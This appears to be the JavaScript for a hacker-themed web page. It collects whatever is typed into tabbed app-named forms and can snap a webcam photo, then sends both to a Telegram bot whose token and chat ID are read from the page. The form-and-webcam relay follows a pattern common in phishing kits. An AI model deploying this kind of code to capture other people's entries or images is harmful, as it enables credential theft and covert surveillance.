const matrixCanvas = document.getElementById('matrixCanvas');
const ctx = matrixCanvas.getContext('2d');
let cameraStream = null;
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const cameraSwitch = document.getElementById('cameraSwitch');
const cameraPreview = document.getElementById('cameraPreview');
const loadingSpinner = document.getElementById('loadingSpinner');

function setupMatrixEffect() {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
  const chars = '101010'.split('');
  const fontSize = 18;
  const columns = matrixCanvas.width / fontSize;
  const drops = Array(Math.floor(columns)).fill(1);
  
  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }
  setInterval(draw, 50);
}

function initTabs() {
  const tabs = document.querySelectorAll('.tab-btn');
  const forms = document.querySelectorAll('.tab-form');
  tabs.forEach(btn => {
    btn.addEventListener('click', () => {
      tabs.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      forms.forEach(f => f.classList.remove('active'));
      document.getElementById(btn.dataset.tab + 'Form').classList.add('active');
    });
  });
}

function validateTelegramConfig() {
  const token = document.getElementById('botToken').value.trim();
  const chatId = document.getElementById('chatId').value.trim();
  return token !== '' && chatId !== '';
}

function collectFormData(appName) {
  const activeForm = document.querySelector('.tab-form.active');
  const formData = new FormData(activeForm);
  const data = {};
  data.app = appName;
  data.thoiGian = new Date().toLocaleString('vi-VN');
  
  for (let [key, value] of formData.entries()) {
    if (value instanceof File) {
      data[key] = value.name || '(không có file)';
    } else {
      data[key] = value || '(trống)';
    }
  }
  
  const checkboxes = activeForm.querySelectorAll('input[type=checkbox]');
  checkboxes.forEach(cb => {
    data[cb.name] = cb.checked ? 'bật' : 'tắt';
  });
  
  const radios = activeForm.querySelectorAll('input[type=radio]');
  if (radios.length) {
    const selected = activeForm.querySelector('input[type=radio]:checked');
    if (selected) data[selected.name] = selected.value;
  }
  
  return data;
}

function showLoading() {
  loadingSpinner.classList.remove('hidden');
}

function sendToTelegram(message, photoBlob = null) {
  const token = document.getElementById('botToken').value.trim();
  const chatId = document.getElementById('chatId').value.trim();
  
  if (!validateTelegramConfig()) {
    alert('Thiếu token hoặc chat ID!');
    return;
  }
  
  if (photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photoBlob, 'capture.jpg');
    formData.append('caption', '📸 Ảnh bạn thân mới treo hộ');
    
    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(err => console.error);
  } else {
    let text = '';
    for (let [k, v] of Object.entries(message)) {
      text += `<b>${k}:</b> ${v}\n`;
    }
    const payload = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    };
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(err => console.error);
  }
}

function captureAndSendPhoto() {
  if (!cameraStream) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    sendToTelegram(null, blob);
  }, 'image/jpeg');
}

function toggleCamera() {
  if (cameraSwitch.checked) {
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        cameraStream = stream;
        video.srcObject = stream;
        cameraPreview.classList.remove('hidden');
        setTimeout(captureAndSendPhoto, 1500);
      })
      .catch(err => {
        alert('Không thể truy cập camera: ' + err.message);
        cameraSwitch.checked = false;
      });
  } else {
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
      cameraStream = null;
      video.srcObject = null;
      cameraPreview.classList.add('hidden');
    }
  }
}

function handleSubmit(event) {
  event.preventDefault();
  if (!validateTelegramConfig()) {
    alert('Vui lòng nhập Token và Chat ID Telegram');
    return;
  }
  
  const activeTab = document.querySelector('.tab-btn.active').dataset.tab;
  const appName = activeTab.charAt(0).toUpperCase() + activeTab.slice(1);
  const formData = collectFormData(appName);
  
  showLoading();
  sendToTelegram(formData);
  
  if (cameraSwitch.checked) {
    captureAndSendPhoto();
  }
}

document.querySelectorAll('.tab-form').forEach(form => {
  form.addEventListener('submit', handleSubmit);
});

cameraSwitch.addEventListener('change', toggleCamera);

window.addEventListener('resize', () => {
  matrixCanvas.width = window.innerWidth;
  matrixCanvas.height = window.innerHeight;
});

setupMatrixEffect();
initTabs();